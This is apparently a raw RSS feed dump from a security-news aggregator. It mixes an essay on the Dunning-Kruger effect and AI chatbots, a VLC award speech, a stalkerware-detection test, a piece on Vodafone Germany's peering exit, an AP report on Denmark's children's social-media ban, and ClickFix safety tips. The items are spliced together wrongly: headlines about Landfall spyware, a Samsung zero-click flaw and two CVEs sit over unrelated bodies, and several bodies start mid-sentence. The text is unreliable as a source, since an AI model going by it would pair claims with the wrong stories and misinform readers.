The reason is that they actually thought they were.Clifton Earl Johnson had convinced his fellow in crime, McArthur Wheeler that covering their faces in lime juice would make them invisible to cameras. Much like lime juice can be “invisible ink” until you heat the paper. As a test, Johnson had taken a polaroid of Wheeler that showed his face smudged. That a camera fault might be the cause, or doing a second test didn’t get to their mind.This baffling over-confidence in their flawed approach inspired two psychologist, Justin Kruger and David Dunning to see if there is a common bias in people when it comes to assessing their skills and their actual performance in doing them. They found out that there is such a thing and it is now known as the Dunning-Kruger Effect.A cognitive bias, where people with little expertise or ability assume they have superior expertise or ability. This overestimation occurs as a result of the fact that they don’t have enough knowledge to know they don’t have enough knowledge.One could say that the Dunning-Kruger effect is the opposite of Impostor Syndrome. Instead of people not being able to interiorise their obvious successes, people declare themselves as great and experts at things they have no or just a rudimentary clue about.Over the last few years we’ve been on a constant path to make this the standard mindset in the technology world. It started with a demand for everything to be released incredibly fast and to be a huge success in numbers from day one. Anything not growing exponentially is not a success.“Fake it till you make it” is given as advice devoid of any irony. Instead, deception and inflation of numbers is seen as a smart move until you have the resources and knowledge to properly do the task. KPIs and OKRs are meant not to reflect delivery goals but aspirations. When you’re not gunning for a promotion every half year you’re not seen as a go-getter or having a growth mindset. In other words, we encourage bragadocious behaviour and language. Some of the things you hear from heads of states and other politicians in interviews sound like Muhammad Ali at press conferences before a fight in the 60s or old school rappers in the 70s and 80s.AI bots excel at faking knowledgeBut even worse, any interaction I have with AI chatbots gives me the same vibes. They give utter nonsense answers with high confidence and wrap errors in sycophantic language making me feel good for pointing out that they wasted my time. A correct answer is a lot less important than a good sounding one, a positive one or one that makes me interact more with the system. Time in product is the goal, not helping me find the right answer.GenAI makes you a genius without any effortThe siren song of generative AI to turn anyone into an artist, wordsmith, composer or videographer by using “intelligent” tools is a push into Dunning Kruger territory. Vibe coding or vibe anything really focuses not on the craft, but the result. We’re not meant to create by learning the ropes and understanding the art. We’re much too clever and busy for that. Give it a prompt and create a product, an app or an agent that does your bidding. We’re continuously reminded that we all are capable of genius – if only we let the machines do the boring work for us. Our egos are fed, we are barraged by digital cheerleaders and confidence tricksters.Stop wasting time learning the craftAdding human effort into things, really creating and writing yourself is taunted as wasting your time and not embracing change and progress. But the cost is that we forget about the craft and we lose the joy of creating. Creativity of any kind is messy and fraught with error and drawbacks. But all of these make us human and who we are. As Leonard Cohen put it: “There is a crack in everything, that’s how the light gets in”. Sure, you might not be good at painting, composing, writing or shooting movies. But a terrible, human effort still is worth so much more than asking the machine to build you a boring solution focused on crowd pleasing more than being a thing in itself.I am not happy about this, and I don’t see it as progress. If anything, it is deception and watering down craft and art. Politics have become an attack on intelligence, decency and research in favour of fairy tales of going back to “great values” of “the past when things were better”. Social media has become devoid of the social part and is a numbers game and addiction machine. But you know what? I don’t care. I keep doing what I do. I write down things I consider important at that time. I paint things although I suck at it. I publish on the web and my own blog because nobody stops me. Sure, I feel like a fraud when people applaud what I do more often that not. And yet – the joy of creation is something we should never give up on. Do you feel like what you do isn’t good enough or worth while? It is, and even if what you did isn’t amazing quality, you’ve created it and it is yours. And maybe, just maybe you are not the best judge to assess the quality of what you did anyways. One person’s disappointment may well be a joy to others. Keep creating and keep striving to improve and if others impressed you, tell them about it.]]></content:encoded></item><item><title>Previously unknown Landfall spyware used in 0-day attacks on Samsung phones</title><link>https://go.theregister.com/feed/www.theregister.com/2025/11/07/landfall_spyware_samsung_0days/</link><author></author><category>security</category><pubDate>Fri, 7 Nov 2025 21:38:35 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

president and core developer with this European award for his long-term
dedication to the project. What began as a student initiative has,
through his continuous effort, evolved into one of the most widely used
media players, with billion of users worldwide.The Free Software Foundation Europe (FSFE), together with the Linux
User Group Bolzano‑Bozen (LUGBZ), is proud to recognize Jean-Baptiste
Kempf with the European SFS Award 2025, in recognition of his
outstanding and lasting contributions to the Free Software movement and
his long-term dedication to the VLC project.Born as a student project in 1996, this software has evolved into an
essential, all-in-one media player that plays almost anything
effortlessly. Originally a simple network streaming client, it has grown
into a powerful universal media player that continues to evolve and
impress. “For many people running non-free operating systems, it was the very
first Free Software they ever installed. For many people running Free
Software, it saved them from installing and booting into a proprietary
operating system”, declared Matthias Kirschner, president of the FSFE
during the Award ceremony. Jean-Baptiste Kempf joined the project as a student, and when it
faced the risk of dying after the graduation of its original developers,
he took the reins. With the help of other core developers, he
transformed it into the indispensable media player we rely on today.Over the years, Kempf has become not only the president of the
VideoLAN non-profit but also one of the lead developers of VLC Media
Player and the founder of VideoLabs. “It’s small, fast, friendly, and
seems to "understand everything you throw at it. I have always thought
of it as "the program that eats everything", said Raphael Barbieri, a
member of LUGBZ, during the winner’s announcement. "I am extremely honoured to receive the European SFS Award. The Free
Software multimedia community is quite niche and unknown, but we work
hard so that video content can be free, can be played and processed. The
work done around the VideoLAN community has been tremendous, despite its
little resources. I want to thank the whole VideoLAN and FFmpeg teams,
who spend their time on those projects, often with little recognition", 
declares Jean-Baptiste Kemp.The European SFS Award recognizes individuals whose work has made a         
significant and sustained difference in advancing Free Software across
Europe. Since 2023 it is presented jointly by LUGBZ and the FSFE and      
honours those whose efforts strengthen software freedom, community      
building, and the ethical foundations of technology.There’s a program most of
us have used - on laptops, phones, tablets or desktops computers. It
might have run on screens in supermarkets or shops. It’s small, fast,
friendly, and seems to "understand everything you throw at it". I have
always thought of it as "the program that eats everything."This amazing software did
not come from a giant technology company with a huge budget. It began
more than twenty years ago - as a modest experiment by a few students at
an engineering school. They wanted to solve a problem they identified.
Nothing fancy - just a student project to tinker, experiment, share, and
have fun. No one knew that those first lines of code written for
“network 2000” would one day reach billions of users.Like many student
projects, it almost faded away when graduation came and the contributors
had other priorities. But one young engineer, who had joined the group
in 2000, refused to let it die. He reorganised the code, inspired new
contributors, and slowly turned a university experiment into a
world-class piece of software. He built a healthy
community fostering the software. Hundreds of volunteers joined. They
contributed by programming, testing, auditing, helping others, with
translations, improving the design, or promoting the software. Thereby
the community grew and people started using the software on every
platform – GNU/Linux and other Unix like operating systems, Windows,
Android, or MacOS and iOS. For many people running non-free operating
systems, it was the very first Free Software they ever installed. For
many people running Free Software, it saved them from installing and
booting into a proprietary operating system.With this success our
winner was offered tempting deals - big money, advertising, corporate
buyouts. Every time, he gently said no. Because it was not about
maximising profit. It was about maximising freedom for computer
users.To protect that freedom,
he later founded a non-profit organisation - so the software would
always belong to its community. He also founded a company to support the
technical side - keeping development professional while staying true to
the values of software freedom. Under his leadership, the initiative has
reached billions of downloads, maintained and added amazing features -
all without losing its soul.And there’s another thing
this community is famous for - its sense of humour. Their symbol? A
bright orange-and-white traffic cone. Legend has it that the original
students used to collect these cones after late nights out. When it came
time to pick a logo, they chose it proudly - a playful symbol of
creativity, chaos, and collaboration.Nowadays, that little
cone has become an icon you find on a huge amount of computers
worldwide. At conferences their contributors wear the cones on their
heads with pride as a clear sign of who they are and what they stand
for.And the person behind it?
He’s not just a brilliant engineer. He’s a leader, a mentor, and a true
advocate for software freedom. In 2018, his contributions were honoured
with the title of Chevalier de l’Ordre National du
Mérite - the first Free Software developer ever to
receive that distinction. Yes - a real knight of software freedom.His “Holy Grail” was not
fame or fortune - it’s : the freedom for
billions of people to watch, listen, and share multimedia files without
restrictions or surveillance. He has shown the world that integrity,
community, and a bit of humour can change how we experience digital
media.Today, we celebrate
someone who has made it possible for all of us to enjoy open, universal
access to media - and who continues to prove that Free Software is
powerful, beautiful, and fun.It is our great pleasure
to present the 
to the president of the VideoLAN non-profit, one of the lead developers
of VLC media player, the founder of VideoLabs, the bearer of the traffic
cone, and a true knight of Free Software....Matthias & Raphael: Jean-Baptiste

Despite measures from both the tech industry and platform providers, stalkerware-type apps, which are apps that can be installed covertly to spy on a victim’s private life, remain a critical concern.This comprehensive assessment, developed in collaboration with Electronic Frontier Foundation (EFF), evaluated 13 leading Android security solutions against 17 diverse stalkerware-type apps. Key findings show that stalkerware persists even as providers and coalitions crack down: it’s sideloaded from developer websites, designed to evade detection, and frequently stores sensitive victim data on insecure servers, often exposing it to wider risks like public data leaks.For this test, each security app was assessed for its ability to clearly detect and report stalkerware, not just using generic labels, but with explicit warnings tailored to support possible victims.AV-Comparatives is an independent organization offering systematic testing that checks whether security software, such as PC/Mac-based antivirus products and mobile security solutions, lives up to its promises. Of the 13 security products tested in September 2025, only a few stood out for detection accuracy, clarity, and responsible alerting, with Malwarebytes the only one to score a 100% detection rate. The results show clear differences in performance between mobile security products.  stood out by detecting all stalkerware testcases, achieving a 100% detection rate. Bitdefender, ESET, Kaspersky, and McAfee followed closely with 94% each, showing consistently high effectiveness. Avast, Avira, and F-Secure also performed well, identifying 88% of the test set, while Norton and Sophos achieved moderate coverage, detecting around 82%. At the lower end, G Data (65%), Google (53%), and Trend Micro (59%) missed a substantial portion of the stalkerware.As one of the founding members of the Coalition Against Stalkerware, Malwarebytes sees this result as much more than a technical win. For us, the mission goes beyond simply blocking malicious software. Stalkerware-type apps are often used by abusers to systematically invade privacy and exert control. Their impact is highly personal, making reliable detection and safe reporting imperative.Our participation in the coalition reflects a commitment to industry best practices: preventing stalkerware-type apps from being quietly installed, giving users detailed and honest threat information, and ensuring that every detection alert is crafted with survivor safety in mind. Scoring 100% in this test validates years of advocacy and development focused on the real-world needs of victims and their supporters, which goes beyond focusing on theoretical malware samples.Ultimately, consistent leadership in stalkerware detection means standing alongside partners and survivor organizations to raise public awareness, drive safer technology, and provide every user with a clear path to reclaim their privacy. For Malwarebytes, achieving a perfect score isn’t just a mark of product quality; it’s proof of our commitment to your privacy and security.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Samsung Zero-Click Flaw Exploited to Deploy LANDFALL Android Spyware via WhatsApp</title><link>https://thehackernews.com/2025/11/samsung-zero-click-flaw-exploited-to.html</link><author></author><category>security</category><pubDate>Fri, 7 Nov 2025 18:00:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Samsung Zero-Click Flaw Exploited to Deploy LANDFALL Android Spyware via WhatsApp

Despite the Vodafone line offering 20× faster download speeds, it's been so unreliable during peak evening hours that we've had to configure the Telefonica DSL as the primary WAN on the UniFi router for the past month. The gigabit connection simply isn't usable for normal internet activities when it matters most. When I read the Vodafone announcement, I had to share my take on it.There's a reason your internet feels like magic. When you download the latest Ubuntu ISO in Berlin, that data doesn't travel some convoluted path through half of Europe to reach you. It normally flows through something called an "internet exchange point"—a giant room full of routers where hundreds of networks connect directly, swapping traffic efficiently and, crucially, for free.Vodafone Germany is about to blow that system up.By the end of 2025, Vodafone will have completely withdrawn from every public internet exchange in Germany, including DE-CIX Frankfurt, the largest internet exchange on the planet. Instead, all traffic will flow through a single company called Inter.link, which possibly will charge content providers based on how much data they send to Vodafone customers. It might be the telecom equivalent of a landlord announcing they're demolishing all the sidewalks in town and replacing them with a private toll road.Vodafone insists this will deliver "lower latencies, more resilience, and cost savings." But if you're a Vodafone customer, you might want to brace yourself. Because there's a decade of evidence from Deutsche Telekom—Germany's other telecom giant, which did almost exactly the same thing—suggesting you're about to experience internet hell.The open internet was supposed to work differentlyTo understand why this matters, you need to understand how the internet actually works. And it's not how most people think.When you pay for internet service, you're not buying access to some centralized "internet"—you're buying access to your ISP's network. That network then connects to thousands of other networks through a patchwork of agreements and connections. The magic happens at places like DE-CIX Frankfurt, where over 1,000 networks plug into the same switching fabric and exchange traffic directly.This system is called "settlement-free peering," and it's one of the internet's foundational principles. No money changes hands. Networks exchange traffic roughly equally, everyone saves money on long-haul transit costs, and users get faster connections because data takes the shortest possible path.When an ISP customer wants to download a large file from a cloud server somewhere on the WWW, chances are that traffic flows directly from the DC operators network to the ISP network at an internet exchange point—maybe four or five router hops, minimal latency, no intermediaries. It's elegant. It's efficient. And it's exactly what Vodafone is abandoning.Instead of connecting directly to content providers at neutral exchange points, Vodafone is outsourcing all its peering to Inter.link, a Berlin-based company that operates what it calls a "peering-as-a-service" platform. Inter.link operates more than 40 points of presence across 15 countries and claims connectivity to 300+ data centers in Europe.The pitch is automation. Instead of managing thousands of individual peering relationships, Vodafone gets "one-click provisioning" and "single sign-on access." For Vodafone's network operations team, this is genuinely simpler. But here's the thing: operational efficiency for a telecom company and good service for customers are not the same thing.Vodafone's official press release from November 2025 emphasized that the partnership with Inter.link would "reduce time, resources, and peering costs" while delivering "lower latencies" and "more resilience." What the company didn't mention is that "peering costs" in this context doesn't mean Vodafone's costs—it means the costs have shifted to content providers, who now have to pay Inter.link if they want decent connectivity to Vodafone's customers.And if a content provider decides not to pay? That's when things get ugly.Inter.link's public peering policy looks remarkably normal on paper. Updated September 1, 2024, it states the company is "open for settlement free peerings" and offers tiered arrangements similar to traditional internet exchanges: route server peering at IXPs with no traffic minimums, direct IXP peering above 1 Gbps, and Private Network Interconnects (PNIs) for networks exceeding 10 Gbps. The policy describes cross-connect cost-sharing but mentions no recurring charges, no per-Mbps fees, and no settlement payments between peering partners.This mirrors how 99.5% of global peering relationships operate according to OECD data—networks pay for infrastructure access while exchanging traffic settlement-free with each other. The policy's technical requirements are actually quite sophisticated: mandatory IPv6 support, strict RPKI route validation, comprehensive BGP filtering, and modern 400GE backbone infrastructure. Nothing in the document reveals anything controversial.Until you notice one critical sentence: "Inter.link does not peer with customers."This single line appears to be the key to understanding Inter.link's entire business model. Here's what we can confirm versus what we must infer:What we know for certain:Inter.link offers settlement-free peering at public exchanges (stated in their policy)They explicitly refuse to peer with their own "customers" (stated in their policy)Vodafone is using Inter.link's commercial "FlexPeer" platform (confirmed in press releases)Inter.link charges for various services including IP Transit and DDoS Protection (published on their website)Content providers previously had direct settlement-free peering with Vodafone at DE-CIX (standard practice, confirmed by DE-CIX)What the evidence strongly suggests: When Vodafone exits DE-CIX and routes all traffic through Inter.link, content providers face a choice. They can establish settlement-free peering with Inter.link at public exchanges—but this doesn't guarantee quality delivery to Vodafone's network, since Vodafone is no longer there. To ensure reliable access to Vodafone's 30+ million customers, they likely need to become Inter.link "customers" using the commercial FlexPeer platform.A simplified example to illustrate the transformation:Before (at DE-CIX Frankfurt):Netflix connects to DE-CIX switch: €500/month port feeVodafone connects to DE-CIX switch: €500/month port feeTraffic flows directly between them: €0 (settlement-free)Total cost to deliver Netflix to Vodafone customers: €500/monthNetflix can peer with Inter.link at DE-CIX: €500/month port fee + €0 peeringBut Vodafone isn't at DE-CIX anymoreFor guaranteed delivery to Vodafone, Netflix likely needs FlexPeer: Unknown commercial rates based on traffic volumeTotal cost: €500/month + Inter.link's commercial feesAgain, I might be wrong here, but this is to the best of my understanding.The genius is in the semantic distinction. Inter.link can truthfully claim they offer "settlement-free peering" while simultaneously converting those potential peers into paying customers through ISP outsourcing arrangements. The company's peering policy contains remarkably little information about these commercial arrangements—no FlexPeer pricing, no volume-based fee structure, no explanation of the revenue model that makes their business viable.This isn't deception—it's careful categorization. Settlement-free peering exists for those who want to exchange traffic with Inter.link itself. But reaching Vodafone customers? That's a commercial service. The traditionally binary relationship (content provider ↔ ISP) becomes triangular (content provider → Inter.link → ISP), with Inter.link extracting fees from what was previously cooperative infrastructure.Deutsche Telekom, another big German ISP, has been at the center of widespread customer complaints about systematic service degradation for years. The problems are not minor inconveniences—they're severe, documented, and directly impact millions of customers' daily internet use.Consumer organizations have documented hundreds of complaints showing that Telekom's business practices restrict customers' freedom to use the apps and sites of their choice: certain websites and services load slowly or not at all, professional cloud services are only partially functional, e-learning videos and games stutter, and video calls repeatedly break off. The coalition filing the complaint states that Telekom is the only provider in Germany that deliberately exploits these bottlenecks at the entrance to its network.The warning signs have been building for yearsThe formal migration to Inter.link started in December 2024, but the degradation accelerated dramatically. A pattern emerges in forum posts and support tickets: complaints about service degradation beginning specifically in November-December 2024, escalating during evening hours, affecting streaming and gaming disproportionately.One user on Vodafone's German forum documented "extreme ping issues" that "particularly escalated in recent weeks" in November 2024, with latency jumping from normal levels to 1,000-2,000 milliseconds. Another described complete connection breakdown during 6-10 PM evening hours, making working from home and gaming "essentially impossible."YouTube appears prominently in complaints. Forum posts describe "seit heute Abend ist Google / Youtube quasi nicht mehr zu erreichen" (since this evening Google/YouTube essentially unreachable), with traceroutes showing 1,000ms latency and 21 hops to reach Google instead of direct connections. That's not random—Heise.de, Germany's most authoritative tech publication, specifically reported that Vodafone is "discontinuing existing direct interconnections with large data sources such as YouTube."The affected services align perfectly with those that would need to establish new paid relationships with Inter.link: YouTube, Netflix, Twitch, gaming platforms. Netflix streams at 0.93 Mbps during peak hours on some Vodafone connections—enough for low-quality SD but nowhere near the 5+ Mbps users get on competing ISPs. Gaming servers show 100-350 millisecond latency when they should be 20-30 milliseconds.Berlin residents experienced particular degradation when Vodafone withdrew from BCIX (Berlin Internet Exchange), with forum posts noting that BCIX peering "was eliminated months ago and notably worsened network quality for Berlin residents." Major content providers including Amazon, Apple, Facebook, Google, Microsoft, Netflix, and Twitch all peered at BCIX for low-latency Berlin connectivity. Those direct connections are gone, replaced by longer routes through Inter.link's more distant points of presence.Let's talk about that "lower latencies" promise, because it defies basic networking principles.Academic research measuring performance across 900+ networks found that 91% experience at least 5% latency improvement via direct peering versus transit, with median improvements of 12-15 milliseconds. The reason is simple physics: shorter paths are faster than longer paths.This is fundamental networking: every additional network you traverse adds latency from routing decisions, queuing delays, and physical transmission time. Direct peering at an exchange point minimizes this. Routing through an intermediary by definition increases it.Unless Inter.link has discovered physics-defying routing magic—and they haven't published any evidence suggesting they have—adding mandatory intermediary hops cannot produce lower latency than direct connections. The architecture change moves in precisely the wrong direction.I couldn't find any supporting measurements. No traceroute comparisons. No latency benchmarks. No throughput tests. No independent technical validation. For a major telecommunications company claiming performance improvements while undertaking a massive infrastructure change, the absence of any quantitative evidence to me is deafening.The satellite escape hatchWhile Vodafone dismantles its open peering infrastructure, an alternative has emerged that sidesteps these politics entirely: satellite internet.Starlink operates its own global backbone network with direct agreements with major content providers. When you access YouTube via Starlink, traffic flows through SpaceX's network to satellites and down to your dish—a fundamentally different architecture from terrestrial ISP peering arrangements.The Starlink residential service won't match premium fiber speeds, but from our own testing we consistently reached above 1oo Mbps median downloads in Germany with 30-40ms latency. More importantly: no selective throttling. Netflix and GitHub load at the same speeds because apparently Starlink doesn't play favorites.For customers experiencing Deutsche Telekom or Vodafone degradation, that consistency matters more than peak speed. The €299 hardware cost hurts, but you're paying for infrastructure that can't be weaponized for rent-seeking. And when Starlink has capacity issues, SpaceX launches more satellites—they solve congestion with infrastructure investment rather than weaponizing it for revenue extraction.That competitive pressure matters. Every customer who switches from Vodafone to satellite because YouTube won't load is revenue walking out the door. Terrestrial ISPs aren't quite the monopolies they used to be. And given upcoming competition in the LEO satellite game, switching will be as easy as changing the satellite dish, no road side cable changes required.To be fair: Starlink seems to also be customer or peer with Inter.link since they are listed on the inter.link website as of today. However, it is for sure not the only peering of Starlink.Here's what Vodafone isn't saying in its press releases: I believe this migration is fundamentally about changing the internet's economic model.Traditional settlement-free peering operates on reciprocity. Networks exchange traffic because both sides benefit—Vodafone's customers want to access YouTube, and YouTube wants to reach Vodafone's customers. No money changes hands because the value exchange is mutual. It's one of the last genuinely cooperative aspects of internet infrastructure.Vodafone's new model charges content providers based on traffic volume, creating what academic experts call a "termination monopoly." If you're a content provider and you want Vodafone's customers to have decent access to your service, you now have to pay Inter.link. Professor Barbara van Schewick of Stanford Law School, whose work informed FCC net neutrality orders and EU guidelines, characterized similar practices by Deutsche Telekom as "a frontal attack on the open internet."In August 2024 comments to European regulators, van Schewick explained that ISPs exploit their "termination monopoly" by charging "monopoly termination fees" to reach subscribers, and concluded that "paid interconnection fees violate the Open Internet Regulation's ban on discrimination and paid fast lanes."In December 2024, Switzerland's telecommunications regulator delivered an 11-year ruling against Swisscom for similar practices. The Swiss ComCom decision found that ISPs have a "technical monopoly of access to their end customers" and that charging content providers for traffic delivery is "not permissible" because costs are already covered by customer subscriptions. The ruling explicitly rejected the "double-dipping" model where both customers and content providers pay for internet access—precisely what Vodafone implements through Inter.link.Think about that: you pay Vodafone for internet access. YouTube pays Inter.link for the privilege of serving you. Both ends pay, but the service you receive gets worse because the architecture degrades and bottlenecks concentrate through fewer connection points. Vodafone saves money on operational overhead while extracting new revenue from content providers. You, the customer, subsidize this twice and get a degraded product.The conflict reached a boiling point in September 2024 when Meta refused to pay Deutsche Telekom €20 million in court-ordered peering fees. Rather than comply, Meta rerouted all its traffic through third-party transit providers, completely severing its direct peering relationship with Deutsche Telekom. The German court had ruled that Deutsche Telekom could charge for peering, but Meta called this "putting the open Internet at risk and undermining net neutrality principles."This isn't just a corporate spat—it's a preview of what Vodafone customers might experience. If major content providers refuse Inter.link's fees and route around Vodafone's network, the quality degradation could be even worse than simple congestion.Regulators are paying attention (finally)The April 2025 complaint against Deutsche Telekom came from a coalition including Germany's federal consumer organization (Verbraucherzentrale Bundesverband), Epicenter.works, Gesellschaft für Freiheitsrechte, and Stanford professor Barbara van Schewick. The complaint documents technical evidence of artificial bottlenecks and charges that Deutsche Telekom creates "paid fast lanes" prohibited under EU law.BEREC (Body of European Regulators for Electronic Communications) released a report in December 2024 after a two-year investigation, identifying practices where ISPs "exploit bottlenecks at the entrance to its network to demand payments from online services" and classifying such practices as "potential violations of Europe's net neutrality law." The report listed "several examples, most of which involved Deutsche Telekom" [as cited in the complaint filing and CISPE's statement].If the investigation finds Deutsche Telekom's model violates EU net neutrality regulations, Vodafone's identical approach faces the same legal jeopardy. Germany's Federal Network Agency has already shown willingness to act—in February 2022, it prohibited Vodafone's "Vodafone Pass" zero-rating service following European Court of Justice rulings. The same authority could order Vodafone to abandon paid peering and return to settlement-free public peering.But regulatory remedies take years. In the meantime, customers suffer.If you're a Vodafone Germany customer, here's what you can probably expect based on Deutsche Telekom's decade of evidence and early Vodafone complaints:Gaming will become frustrating or unplayable during peak hours. Latency will spike. Packet loss will make competitive games impossible. You'll blame the game servers, but the problem might be your ISP's routing.Video calls, remote work, cloud applications—anything latency-sensitive—could degrade during 7-11 PM peak hours when traffic concentrates through Inter.link's connection points. Your Zoom calls will pixelate. Your remote desktop sessions will lag. Your cloud backups will throttle.Smaller content providers, startups, regional services—anyone who can't or won't pay Inter.link's fees—might work noticeably worse on your Vodafone connection than on competing ISPs. You'll have a two-tiered internet: fast lanes for services that pay, slow lanes for everything else.And when you call Vodafone support, they'll most likely run speed tests that show your connection hitting advertised speeds to Vodafone's own servers, and they'll tell you everything looks fine from their end. Because technically, it does. The problem isn't your connection to Vodafone—it's Vodafone's restrictive connections to the rest of the internet.Vodafone's exit from public peering isn't an isolated technical decision—it's part of a broader pattern of large telecoms trying to reshape internet economics in their favor. Thomas King, CTO of DE-CIX Frankfurt, warned without naming companies directly: "We are currently observing a trend in which large market players are increasingly using their dominant position to monetize not only their Internet access business but also network interconnection."The trend is particularly concentrated in Germany, where both major incumbent ISPs now operate restrictive paid peering models while competitors maintain open policies. IT-Administrator, a leading German IT publication, warned that Vodafone's shift "could reduce transparency, while smaller providers and content providers may face higher entry barriers" and "could impair the diversity and openness of European Internet infrastructure."German technical forums reflect a resigned cynicism. One commenter noted that Vodafone has "become big enough with their cable network, OXG and subsidized network operations that they now want to pull a Telekom." Another called it an inevitable "own goal" that would generate negative press just like Deutsche Telekom's model. The consensus: "Nobody likes it, everyone hates it, there are no benefits for the customer."The Cloud Infrastructure Service Providers in Europe (CISPE) warned in April 2025 that these practices have been affecting European cloud providers for a decade, with members reporting "artificial network service quality degradation" used to extract "additional unjustified payments" since at least 2015. They never filed formal complaints, fearing "retaliation and getting tangled up in costly legal proceedings."The Meta-Deutsche Telekom conflict in September 2024 demonstrates where this leads. When courts upheld Deutsche Telekom's right to charge €20 million for peering, Meta simply walked away, rerouting all traffic through third-party providers. If major content providers make similar decisions with Vodafone's Inter.link model, German internet users could find themselves increasingly isolated from global services.If this model proves profitable for Vodafone and Deutsche Telekom without regulatory consequences, expect other European telecoms to follow. The open internet—where networks cooperate through settlement-free peering to deliver the best possible service—gets replaced by a gatekeeper model where ISPs extract fees from both customers and content providers while delivering worse performance.Technical communities are already calling it what it is: "Peering Extortion Policy." The question now is whether European regulators will act before this model spreads beyond Germany, or whether the cooperative internet will be replaced by a series of toll gates, with ISPs as the gatekeepers and everyone else paying the price.The internet you pay for isn't the internet you're gettingHere's the fundamental thing to understand: when you pay Vodafone for internet service, you think you're buying neutral access to the global internet. You're not. You're buying access to Vodafone's network, and Vodafone controls how well that network connects to everything else.For decades, ISPs and content networks cooperated through settlement-free peering at neutral exchange points, creating the fast, reliable internet we take for granted. That cooperative model is breaking down, replaced by gatekeepers who charge both ends while delivering worse service.Vodafone's marketing says the Inter.link migration will give you "lower latencies." The architecture says you're getting longer paths, more hops, and concentration through fewer connection points. Deutsche Telekom's decade of customer misery says you're about to experience systematic service degradation. Early Vodafone complaints say it's already starting.The evidence is overwhelming. Vodafone customers should brace for impact. And everyone else should pay attention—because if this model succeeds in Germany, it's coming to your country next.Deutsche Telekom Complaints & Evidence:Academic & Technical Research:]]></content:encoded></item><item><title>CVE-2025-3222 - Smallworld SWMFS Improper Authentication</title><link>https://cvefeed.io/vuln/detail/CVE-2025-3222</link><author></author><category>vulns</category><pubDate>Fri, 7 Nov 2025 16:28:45 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-3222

It wasn’t immediately clear how such a ban would be enforced: Many tech platforms already restrict pre-teens from signing up. Officials and experts say such restrictions don’t always work.Such a measure would be among the most sweeping steps yet by a European Union government to limit use of social media among teens and younger children, which has drawn concerns in many parts of an increasingly online world.Speaking to The Associated Press, Caroline Stage, Denmark’s minister for digital affairs, said 94% of Danish children under age 13 have profiles on at least one social media platform, and more than half of those under 10 do. “The amount of time they spend online — the amount of violence, self-harm that they are exposed to online — is simply too great a risk for our children,” she said, while praising tech giants as “the greatest companies that we have. They have an absurd amount of money available, but they’re simply not willing to invest in the safety of our children, invest in the safety of all of us.”No rush to legislation, no loopholes for tech giantsStage said a ban won’t take effect immediately. Allied lawmakers on the issue from across the political spectrum who make up a majority in parliament will likely take months to pass relevant legislation. “I can assure you that Denmark will hurry, but we won’t do it too quickly because we need to make sure that the regulation is right and that there is no loopholes for the tech giants to go through,” Stage said. Her ministry said pressure from tech giants’ business models was “too massive.” That made platforms including TikTok, Facebook, Snapchat, Reddit, X and Instagram subject to fines of up to 50 million Australian dollars ($33 million) for systemic failures to prevent children younger than 16 from holding accounts.Officials in Denmark didn’t say how such a ban would be enforced in a world where millions of children have easy access to screens. But Stage noted that Denmark has a national electronic ID system — nearly all Danish citizens over age 13 have such an ID — and plans to set up an age-verification app. Several other EU countries are testing such apps. “We cannot force the tech giants to use our app, but what we can do is force the tech giants to make proper age verification, and if they don’t, we will be able to enforce through the EU commission and make sure that they will be fined up to 6% of their global income.”Aiming to shield kids from harmful content onlineMany governments have been grappling with ways of limiting harmful fallout from online technologies, without overly squelching their promise. Stage said Denmark’s legislative push was “not about excluding children from everything digital” — but keeping them away from harmful content.“Children and young people have their sleep disrupted, lose their peace and concentration, and experience increasing pressure from digital relationships where adults are not always present,” the Danish ministry said. “This is a development that no parent, teacher or educator can stop alone.”The EU’s Digital Services Act, which took effect two years ago, forbids children younger than 13 to hold accounts on social media like TikTok and Instagram, video sharing platforms like YouTube and Twitch, and sites like Reddit and Discord, as well as AI companions. Many social media platforms have for years banned anyone 13 or under from signing up for their services. TikTok users can verify their ages by submitting a selfie that will be analyzed to estimate their age. Meta Platforms, parent of Instagram and Facebook, says it uses a similar system for video selfies and AI to help figure out a user’s age.TikTok said in an email that it recognizes the importance of Denmark’s initiative. “At TikTok, we have steadfastly created a robust trust and safety track record, with more than 50 preset safety features for teen accounts, as well as age appropriate experiences and tools for guardians such as Family Pairing,” a tool allowing parents, guardians, and teens to customize safety settings.We look forward to working constructively on solutions that apply consistently across the industry,” it added.Meta didn’t respond immediately to requests for comment from the AP.“We’ve given the tech giants so many chances to stand up and to do something about what is happening on their platforms. They haven’t done it,” said Stage, the Danish minister. “So now we will take over the steering wheel and make sure that our children’s futures are safe.”AP Business Writer Kelvin Chan contributed to this report. ]]></content:encoded></item><item><title>CVE-2025-63689 - Ycf1998 Money-Pos System SQL Injection Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-63689</link><author></author><category>vulns</category><pubDate>Fri, 7 Nov 2025 16:15:42 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-63689

A countdown timer adds urgency, pressuring users to complete the “challenge” within a minute. When people rush instead of thinking things through, social engineering wins.Unsurprisingly, most of these pages spread through SEO-poisoned Google search results, although they also circulate via email, social media, and in-app ads too.With ClickFix running rampant—and it doesn’t look like it’s going away anytime soon—it’s important to be aware, careful, and protected.Don’t rush to follow instructions on a webpage or prompt, especially if it asks you to run commands on your device or copy-paste code. Attackers rely on urgency to bypass your critical thinking, so be cautious of pages urging immediate action. Sophisticated ClickFix pages add countdowns, user counters, or other pressure tactics to make you act quickly.Avoid running commands or scripts from untrusted sources. Never run code or commands copied from websites, emails, or messages unless you trust the source and understand the action’s purpose. Verify instructions independently. If a website tells you to execute a command or perform a technical action, check through official documentation or contact support before proceeding.Limit the use of copy-paste for commands. Manually typing commands instead of copy-pasting can reduce the risk of unknowingly running malicious payloads hidden in copied text.Educate yourself on evolving attack techniques. Understanding that attacks may come from unexpected vectors and evolve helps maintain vigilance.

popular? I mean, the language is not perfect, but the more I use it the
more I feel like this old language had it all figured out, somehow. I
mean, not in the literal sense: you write 
instead of  because the language has French
origins. But it is perfect in the sense that it has everything that is
important to me, except popular adoption. OCaml has its quirks, its old
age, but at the same time there is so much I appreciate about it.I have some experience building amateur and professional software, in
